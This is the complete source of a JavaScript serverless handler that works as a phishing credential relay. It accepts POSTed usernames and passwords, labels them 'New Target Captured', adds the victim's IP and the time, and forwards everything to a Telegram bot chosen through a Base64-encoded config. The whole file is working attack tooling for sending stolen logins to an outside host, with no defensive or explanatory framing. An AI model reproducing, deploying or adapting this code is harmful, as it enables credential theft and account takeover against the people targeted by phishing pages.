export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { config, data } = req.body;

    if (!config || !data) return res.status(400).json({ error: 'Payload missing' });

    try {
        // Decode the Base64 config from the URL
        const decoded = JSON.parse(Buffer.from(config, 'base64').toString());

        const message = `🎯 **New Target Captured**\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `👤 **User**: \`${data.User}\` \n` +
                        `🔑 **Pass**: \`${data.Pass}\` \n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `🌐 **IP**: \`${req.headers['x-forwarded-for'] || 'Unknown'}\` \n` +
                        `🕒 **Time**: ${new Date().toLocaleString()}`;

        // Send to Telegram
        const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
        
        const response = await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: decoded.c,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) throw new Error('Telegram API Error');

        return res.status(200).json({ success: true });
    } catch (err) {
        console.error(err);
        return res.status(500).json({ error: 'Relay failed' });
    }
}
